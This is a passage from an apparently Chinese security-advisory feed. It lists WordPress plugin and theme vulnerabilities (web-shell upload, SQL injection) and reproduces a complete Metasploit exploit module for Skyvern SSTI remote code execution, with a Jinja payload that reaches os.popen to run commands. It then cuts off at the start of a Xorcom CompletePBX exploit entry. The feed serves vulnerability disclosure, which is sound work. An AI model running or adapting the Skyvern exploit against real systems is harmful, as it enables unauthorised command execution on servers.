    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gv3g-5wrh-3x24">https://github.com/advisories/GHSA-gv3g-5wrh-3x24</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49885">https://nvd.nist.gov/vuln/detail/CVE-2025-49885</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/drag-and-drop-file-upload-wc-pro/vulnerability/wordpress-drag-and-drop-multiple-file-upload-pro-woocommerce-5-0-6-arbitrary-file-upload-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/drag-and-drop-file-upload-wc-pro/vulnerability/wordpress-drag-and-drop-multiple-file-upload-pro-woocommerce-5-0-6-arbitrary-file-upload-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gv3g-5wrh-3x24">https://github.com/advisories/GHSA-gv3g-5wrh-3x24</a></p></li></ul><p><strong>描述：</strong></p><p>Unrestricted Upload of File with Dangerous Type vulnerability in HaruTheme Drag and Drop Multiple File Upload (Pro) - WooCommerce allows Upload a Web Shell to a Web Server. This issue affects Drag and Drop Multiple File Upload (Pro) - WooCommerce: from n&#x2F;a through 5.0.6.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gv3g-5wrh-3x24&quot;&gt;https://github.com/advisories/GHSA-gv3g-5wrh-3x24&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
    <link href="http://example.com/2025/06/27/github_3046966633/"/>
    <id>http://example.com/2025/06/27/github_3046966633/</id>
    <published>2025-06-27T13:00:06.653Z</published>
    <updated>2025-06-27T13:00:06.652Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-56w7-j49g-8w64">https://github.com/advisories/GHSA-56w7-j49g-8w64</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52829">https://nvd.nist.gov/vuln/detail/CVE-2025-52829</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/directiq-wp/vulnerability/wordpress-directiq-email-marketing-2-0-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/directiq-wp/vulnerability/wordpress-directiq-email-marketing-2-0-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-56w7-j49g-8w64">https://github.com/advisories/GHSA-56w7-j49g-8w64</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in DirectIQ DirectIQ Email Marketing allows SQL Injection. This issue affects DirectIQ Email Marketing: from n&#x2F;a through 2.0.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-56w7-j49g-8w64&quot;&gt;https://github.com/advisories/GHSA-56w7-j49g-8w64&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
    <link href="http://example.com/2025/06/27/github_4192354253/"/>
    <id>http://example.com/2025/06/27/github_4192354253/</id>
    <published>2025-06-27T13:00:04.984Z</published>
    <updated>2025-06-27T13:00:04.984Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3j27-hx2r-vv4c">https://github.com/advisories/GHSA-3j27-hx2r-vv4c</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52834">https://nvd.nist.gov/vuln/detail/CVE-2025-52834</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/homey/vulnerability/wordpress-homey-2-4-5-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/homey/vulnerability/wordpress-homey-2-4-5-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3j27-hx2r-vv4c">https://github.com/advisories/GHSA-3j27-hx2r-vv4c</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in favethemes Homey allows SQL Injection. This issue affects Homey: from n&#x2F;a through 2.4.5.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3j27-hx2r-vv4c&quot;&gt;https://github.com/advisories/GHSA-3j27-hx2r-vv4c&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Skyvern SSTI Remote Code Execution</title>
    <link href="http://example.com/2025/06/27/github_2121970396/"/>
    <id>http://example.com/2025/06/27/github_2121970396/</id>
    <published>2025-06-27T12:45:15.389Z</published>
    <updated>2025-06-27T12:45:15.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Skyvern SSTI Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-49619</li></ul><p><strong>漏洞类型：</strong> 服务端模板注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 该模块利用了Skyvern&lt;&#x3D;0.1.84版本中的服务端模板注入（SSTI）漏洞，允许远程代码执行。模块需要API密钥来发送请求并上传恶意工作流。</p><p><strong>产品厂商：</strong> Skyvern</p><p><strong>产品名称：</strong> Skyvern</p><p><strong>影响版本：</strong> &lt;&#x3D;0.1.84</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/a7b038b8226afcb44cba8549714fb646da5f49a5/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb">https://github.com/rapid7/metasploit-framework/blob/a7b038b8226afcb44cba8549714fb646da5f49a5/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Skyvern SSTI Remote Code Execution&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits SSTI vulnerability in Skyvern&lt;=0.1.84. The module requires API key to deliver requests and upload malicious workflow.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Cristian Branet&#x27;</span>, <span class="hljs-comment"># researcher</span><br>          <span class="hljs-string">&#x27;msutovsky-r7&#x27;</span> <span class="hljs-comment"># module dev</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;52335&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://cristibtz.blog/posts/CVE-2025-49619/&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-49619&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux Target&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Payload&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;BadChars&#x27;</span> =&gt; <span class="hljs-string">%(&quot;)</span> &#125;,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-07&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;API_KEY&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;API key for Skyvern&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow_json</span><br>    &#123;<br>      <span class="hljs-symbol">title:</span> <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>),<br>      <span class="hljs-symbol">description:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">proxy_location:</span> <span class="hljs-string">&#x27;RESIDENTIAL&#x27;</span>,<br>      <span class="hljs-symbol">webhook_callback_url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">persist_browser_session:</span> <span class="hljs-literal">false</span>,<br>      <span class="hljs-symbol">model:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">workflow_definition:</span> &#123;<br>        <span class="hljs-symbol">parameters:</span> [],<br>        <span class="hljs-symbol">blocks:</span> [<br>          &#123;<br>            <span class="hljs-symbol">label:</span> <span class="hljs-string">&#x27;block_1&#x27;</span>,<br>            <span class="hljs-symbol">continue_on_failure:</span> <span class="hljs-literal">false</span>,<br>            <span class="hljs-symbol">block_type:</span> <span class="hljs-string">&#x27;task_v2&#x27;</span>,<br>            <span class="hljs-symbol">prompt:</span> <span class="hljs-string">%&lt;&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;\n  &#123;% if &#x27;warning&#x27; in x.__name__ %&#125;\n    &#123;&#123; x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;<span class="hljs-subst">#&#123;payload.encoded&#125;</span>&quot;).read() &#125;&#125;\n  &#123;% endif %&#125;\n&#123;% endfor %&#125;&gt;</span>,<br>            <span class="hljs-symbol">url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-symbol">max_steps:</span> <span class="hljs-number">25</span>,<br>            <span class="hljs-symbol">totp_identifier:</span> <span class="hljs-literal">nil</span>,<br>            <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span><br>          &#125;<br>        ]<br>      &#125;,<br>      <span class="hljs-symbol">is_saved_task:</span> <span class="hljs-literal">false</span><br>    &#125;<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; create_workflow_json.to_json<br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-variable">@workflow_id</span> = res_json.fetch(<span class="hljs-string">&#x27;workflow_permanent_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> <span class="hljs-variable">@workflow_id</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows/&#x27;</span>, <span class="hljs-variable">@workflow_id</span>, <span class="hljs-string">&#x27;/run&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; &#123; <span class="hljs-symbol">workflow_id:</span> <span class="hljs-variable">@workflow_id</span> &#125;.to_json<br>    &#125;)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> res_json.fetch(<span class="hljs-string">&#x27;workflow_id&#x27;</span>, <span class="hljs-literal">nil</span>) |<span class="hljs-params"></span>| res_json.fetch(<span class="hljs-string">&#x27;workflow_run_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;Target is probably not Skyvern&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>(<span class="hljs-string">&#x27;Failed to get additional information - target is either not Skyvern or you used incorrect API key&#x27;</span>) <span class="hljs-keyword">unless</span> res_json<br><br>    <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Detected</span>(<span class="hljs-string">&#x27;Target is Skyvern&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    create_workflow<br>    trigger_workflow<br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Skyvern SSTI Remote Code Execution&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github commit" scheme="http://example.com/tags/rapid7-metasploit-framework-github-commit/"/>
    
    <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</title>
    <link href="http://example.com/2025/06/27/github_2385386118/"/>
    <id>http://example.com/2025/06/27/github_2385386118/</id>
    <published>2025-06-27T12:15:24.231Z</published>
    <updated>2025-06-27T12:15:24.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-30004</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Xorcom CompletePBX 5.2.35及以下版本中存在一个通过任务调度功能触发的认证命令注入漏洞。该漏洞允许具有web服务器权限的用户执行任意命令。只有超级管理员用户（admin）才能触发此漏洞，即使创建具有最大权限的新用户也无法利用此漏洞。</p><p><strong>产品厂商：</strong> Xorcom</p><p><strong>产品名称：</strong> CompletePBX</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.2.35</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/17b67dfbca6d941ef8e8947a8dfc7a90ac2d2089/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb">https://github.com/rapid7/metasploit-framework/blob/17b67dfbca6d941ef8e8947a8dfc7a90ac2d2089/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span 